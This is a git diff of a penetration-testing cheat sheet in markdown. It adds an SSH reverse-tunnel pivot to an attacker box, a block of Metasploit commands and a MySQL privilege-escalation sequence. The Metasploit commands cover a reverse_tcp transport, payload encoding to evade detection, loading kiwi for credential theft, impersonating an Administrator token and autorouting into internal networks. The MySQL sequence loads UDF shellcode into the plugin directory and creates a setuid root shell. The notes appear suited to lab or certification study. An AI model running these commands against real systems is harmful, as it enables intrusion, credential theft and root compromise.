@@ -2,6 +2,7 @@
 # Common 
 
 - [CyberChef](https://gchq.github.io/CyberChef) - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis
+- [OSINT Framework](https://osintframework.com/)
 
 ## Enumeration
 
@@ -32,11 +33,10 @@ nping –tcp -p 80 -c 4 –flags SYN $target_ip
 nping –tcp-connect -c 1 -p 3389 $target_ip
 ```
 
-## Metasploit 
+## Pivoting 
 
-### Auto Migrate 
 ```
-set AutoRunScript multi_console_command -r $pwd/payloads_linux/automigrate.rc
+ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
 ```
 
 ## Docker 
@@ -57,4 +57,50 @@ docker run --network=br0 -it --rm uzyexe/nmap
 Check if in Docker guest:
 ```
 cat /proc/self/cgroup | grep docker
+```
+
+## Metasploit
+```
+set AutoRunScript multi_console_command -r $pwd/payloads_linux/automigrate.rc
+```
+```
+set AutoRunScript post/windows/manage/migrate
+```
+```
+set AutoRunScript windows/gather/enum_logged_on_users
+```
+```
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+```
+```
+transport add -t reverse_tcp -l 10.11.0.4 -p 5555
+transport list
+```
+```
+load powershell
+load kiwi
+```
+```
+route add 192.168.1.0/24 11
+route print
+use multi/manage/autoroute
+use auxiliary/server/socks4a
+portfwd add -l 3389 -p 3389 -r 192.168.1.110
+```
+```
+use incognito
+list_tokens -u
+impersonate_token example\\Administrator
+```
+
+## MySQL
+
+46249
+```
+select @@plugin_dir
+select binary 0xshellcode into dumpfile @@plugin_dir;
+create function sys_exec returns int soname udf_filename;
+select * from mysql.func where name='sys_exec' \G
+select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
 ```
